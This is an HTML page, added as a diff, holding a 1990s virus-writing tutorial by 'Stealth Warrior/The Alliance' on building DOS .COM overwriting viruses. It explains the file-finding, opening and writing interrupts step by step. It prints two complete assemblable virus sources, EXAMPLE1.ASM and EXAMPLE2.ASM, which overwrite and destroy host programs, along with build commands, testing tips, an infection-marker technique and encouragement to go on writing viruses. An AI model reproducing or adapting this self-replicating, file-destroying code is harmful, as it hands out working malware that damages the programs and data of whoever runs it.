@@ -1,0 +1,337 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Stealth Warrior - Overwriting Virus</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+2>Overwriting Virus<BR>
+by<BR>
+Stealth Warrior/The Alliance</FONT></FONT></B><BR>
+</P></CENTER>
+
+<UL>
+<UL>
+<UL>
+<PRE>
+My page: http://www.geocities.com/SiliconValley/Heights/5303
+My E-Mail address: stealthwarrior@hotmail.com</PRE>
+</UL>
+</UL>
+</UL>
+
+<UL>
+<PRE>
+ ----------------------------------------------------------------------------
+ DISCLAIMER:
+ Information included in this file is not to be used in any malicious or
+ otherwise irresponsible manner. The author is not responsible for any
+ damages, incidental or otherwise, resulting from using information from
+ this file. Responsibility is entirely placed on the reader (user).
+ ----------------------------------------------------------------------------
+
+Overwriting virus is a virus that overwrites its host. It means that the host
+can no more be executed because a virus has overwritten it. When an infected
+program is run, a virus is executed instead. It then replicates and if certain
+conditions are true it displays a string, destroys data, ...
+This is what it looks like (from Phalcon/Skism's 40Hex):
+
++---------------+   +-------+   +-------+-------+
+| P R O G R A M | + | VIRUS | = | VIRUS | R A M |
++---------------+   +-------+   +-------+-------+
+
+Now let's see what our overwriting virus has to do:
+  1. Find a proper file.
+  2. Open the file for read/write.
+  3. Write the virus to the file.
+  4. Close the file.
+  5. Exit.
+
+But what if the file is already infected? In case of overwriting viruses this
+isn't important and we can ignore that. But if we do not want our virus to
+spend extra time infecting the file for the 13th time, we should use a kind of
+ID. More on that later. Let's look at the basic steps first:
+
+  1. We find the first .COM file.
+     input:
+        ah : 4eh
+        cx : file attributes
+        dx : OFFSET address of file name
+        ds : SEGMENT address of file name
+
+     mov  ah,4eh                          ;'Find first' service.
+     xor  cx,cx                           ;Look for normal attributes.
+     lea  dx,com_files                    ;We want a .COM file!
+     int  21h
+
+    We have to define what com_files means, so:
+     com_files: db &quot;*.com&quot;,0
+
+  2. First some info on DTA (Disk Transfer Area):
+    Info about the file we have found is put into DTA and looks like this:
+
+     0h  db 21 dup(0)                     ;Reserved for DOS.
+     15h db 00                            ;File attributes.
+     16h dw 0000                          ;File time.
+     18h dw 0000                          ;File date.
+     1ah dd 00000000                      ;File size.
+     1eh db 13 dup(0)                     ;File name.
+
+    This DTA is now in the PSP (Program Segment Prefix). More on PSP later.
+    All you need to know now is that DTA begins at 80h.
+    Now let's go to opening a file:
+     input:
+        ah : 3dh
+        al : 00h                          ;Open for reading.
+             01h                          ;Open for writing.
+             02h                          ;Open for reading/writing.
+        dx : OFFSET address of the file name
+        ds : SEGMENT address of the file name
+
+     output:
+        ax : file handle
+
+     mov  ax,3d02h                        ;Open file for read/write.
+     mov  dx,9eh                          ;80h+1eh=9eh
+     int  21h
+
+    The file handle is used by DOS to know where to read from or where to
+    write to.
+
+  3. Now let's write our virus to the file.
+     input:
+        ah : 40h
+        bx : file handle
+        cx : number of bytes to write
+        dx : OFFSET of address of the beginning of the virus
+
+    As you can see we need file handle in bx but we have it in ax. No problem:
+        xchg bx,ax                        ;Put ax into bx.
+
+        mov  ah,40h
+        mov  cx,OFFSET vend-OFFSET vstart ;This will get no. of bytes to write.
+        lea  dx,start                     ;Beginning of the virus.
+        int  21h
+
+  4. Close the file.
+     input:
+        ah : 3eh
+        bx : file handle
+
+        mov  ah,3eh                       ;Close the file.
+        int  21h
+
+   5. Exit.
+        int  20h
+
+    Here's the complete source:
+-&lt;EXAMPLE1.ASM&gt;---------------------------------------------------------------
+;Example 1 from Overwriting Virus Tutorial by Stealth Warrior
+;Very simple .COM overwriting virus - 40 bytes long
+;Since this is a very simple virus, it only infects one file per run - it
+;finds the first .COM file in current directory. The virus itself could be
+;the first .COM file, so it will infect itself and it will seem like it
+;doesn't work. It works, believe me. There's a simple solution: rename the
+;file EXAMPLE1.COM to ZZZ.COM and copy a test file to the same directory.
+;Let's take DEBUG.COM for example. Next thing you have to do is to sort the
+;files by file name so that DEBUG.COM will be the first file. Run ZZZ.COM and
+;DEBUG.COM will be infected. Simple? Nah...
+;Instructions:
+; TASM EXAMPLE1.ASM
+; TLINK /t EXAMPLE1.ASM
+Code   Segment
+       Assume CS:code,DS:code
+       Org     100h
+virus  proc near
+vstart:mov  ah,4eh                        ;&lt;Find the first
+       xor  cx,cx                         ; .COM file
+       lea  dx,com_files                  ; with normal
+       int  21h                           ; attributes.&gt;
+       mov  ax,3d02h                      ;&lt;Open the file
+       mov  dx,9eh                        ; for reading
+       int  21h                           ; and writing.&gt;
+       xchg bx,ax                         ;Put ax into bx.
+       mov  ah,40h                        ;&lt;Write
+       mov  cx,OFFSET vend-OFFSET vstart  ; the virus
+       lea  dx,vstart                     ; to the
+       int  21h                           ; file.&gt;
+       mov  ah,3eh                        ;&lt;Close the
+       int  21h                           ; file.&gt;
+       int  20h                           ;Exit.
+com_files:  db &quot;*.com&quot;,0
+vend   label near
+virus  endp
+code   ends
+       end   vstart
+------------------------------------------------------------------------------
+
+A few pages back I mentioned ID to see if the file is already infected. Let's
+take a look at that now. We must choose an ID first-let's take 'a'.We will put
+this ID right after the jump to main code of the virus:
+
+    vstart:
+           jmp  virus
+    ID db 'a'
+    virus:
+      ...
+
+All that our virus needs to do is to read the first 4 bytes (jmp and OFFSET
+equals 3 bytes, our ID is the 4th) of a file and check if the 4th is 'a'.
+Otherwise it infects it.
+
+Here's the flow-chart:
+  1. Find a proper file.If no files found then exit.
+  2. Open the file for reading.
+  3. Read the first 4 bytes.
+  4. Close the file.
+  5. Compare the 4th byte to ID.
+     a) If already infected then go to step 1.
+     b) If not infected continue.
+  6. Open file for read/write.
+  7. Write the virus to the file.
+  8. Close the file.
+  9. Exit.
+
+But since viruses should be optimized, we'll use the following flow-chart:
+  1. Find a proper file.If no files found then exit.
+  2. Open the file for reading/writing.
+  3. Read the first 4 bytes.
+  4. Compare the 4th byte to ID.
+     a) If already infected then close the file and go to step 1.
+     b) If not infected continue.
+  5. Write the virus to the file.
+  6. Close the file.
+  7. Exit.
+
+You see the improvement? You should always optimize your code!
+
+Here's how it's done:
+
+  1.    mov  ah,4eh                       ;'Find first' service.
+        xor  cx,cx                        ;Look for normal attributes.
+        lea  dx,com_files                 ;We want a .COM file!
+        int  21h
+        jc   exit                         ;Exit if no files found.
+
+    We have to define what com_files means, so:
+     com_files: db &quot;*.com&quot;,0
+
+  2.    mov  ax,3d02h                     ;Open file for reading/writing.
+        mov  dx,9eh                       ;80h+1eh=9eh
+        int  21h
+        xchg bx,ax                        ;Put ax into bx.
+
+  3.Nothing new up to this point. Here's something new-we will read the first
+    four bytes of the file and put it in bytes.
+
+     Input:
+        ah : 3fh
+        bx : file handle
+        cx : bytes to read
+        dx : OFFSET of buffer (buffer is the place where you put the read
+                               bytes)
+
+        mov  ah,3fh
+        mov  cx,4
+        lea  dx,bytes
+        int  21h
+
+    We have to define bytes,so:
+        bytes db ?,?,?,?
+
+  4.Now we compare the 4th byte to our ID:
+        cmp  byte ptr [bytes+3],'a'       ;Is the 4th byte 'a'?
+        jnz  infect                       ;No,so infect it.
+        mov  ah,4fh                       ;4fh is for 'find next'
+
+  5.    mov  ah,40h
+        mov  cx,OFFSET vend-OFFSET vstart ;This will get no. of bytes to write.
+        lea  dx,start                     ;Beginning of the virus.
+        int  21h
+
+  6.    mov  ah,3eh                       ;Close the file.
+        int  21h
+
+  7.    int  20h
+
+    And here's the complete source:
+-&lt;EXAMPLE2.ASM&gt;---------------------------------------------------------------
+;Example 2 from Overwriting Virus Tutorial by Stealth Warrior
+;Better .COM overwriting virus - 80 bytes long
+;Instructions:
+; TASM /m2 EXAMPLE2.ASM
+; TLINK /t EXAMPLE2.ASM
+
+code    segment
+        assume  cs:code,ds:code
+        org     100h
+virus   proc    near
+vstart:
+        jmp  first
+        db   'a'                         ;Our ID.
+first:  mov  ah,4eh                      ;&lt;Find the first...
+find:   xor  cx,cx                       ; ... .COM file
+        lea  dx,com_files                ; with normal
+        int  21h                         ; attributes.&gt;
+        jc   exit                        ;No files found,exit.
+
+        mov  ax,3d02h                    ;&lt;Open the file
+        mov  dx,9eh                      ; for reading
+        int  21h                         ; and writing.&gt;
+        xchg bx,ax                       ;Put ax into bx.
+        mov  ah,3fh                      ;&lt;Read the first
+        mov  cx,4                        ; four bytes and
+        lea  dx,bytes                    ; put them into
+        int  21h                         ; bytes.&gt;
+        cmp  byte ptr[bytes+3],'a'       ;Is the 4th byte 'a'?
+        jnz  infect                      ;No,so infect it.
+        mov  ah,3eh                      ;&lt;Close the
+        int  21h                         ; file.&gt;
+        mov  ah,4fh                      ;&lt;Find the
+        jmp  find                        ; next...&gt;
+infect: xor  al,al                       ;&lt;Go to
+        mov  ah,42h                      ; the
+        xor  cx,cx                       ; beginning
+        cwd                              ; of the
+        int  21h                         ; file.&gt;
+        mov  ah,40h                      ;&lt;Write
+        mov  cx,OFFSET vend-OFFSET vstart; the virus
+        lea  dx,vstart                   ; to the
+        int  21h                         ; file.&gt;
+        mov  ah,3eh                      ;&lt;Close the
+        int  21h                         ; file.&gt;
+exit:   int  20h                         ;Exit.
+com_files db &quot;*.com&quot;,0
+bytes db ?,?,?,?
+vend  label near
+virus endp
+code  ends
+      end   vstart
+
+------------------------------------------------------------------------------
+
+Well, that's it for .COM overwriting viruses. Don't bother with .EXE, because
+it's very similar and please don't stay at overwriting virus level, learn
+more! I hope my tutorials will help you.
+
+You can get all my tutorials and more at my page - see the beginning of this
+file for the address.
+
+Greetz'n'thanx to:
+  -The Alliance : Yo to all memberz
+  -P/S : a great group, your tutorials and 40hex helped me a lot
+  -NuKE : a great group too, Rock Steady's tutorials are cool
+  -VLAD : a great magazine, guys
+  -Immortal Riot : I like your 'zine
+  -Ratboy : cool tutorial
+
+  -all other virus writers in the world!</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
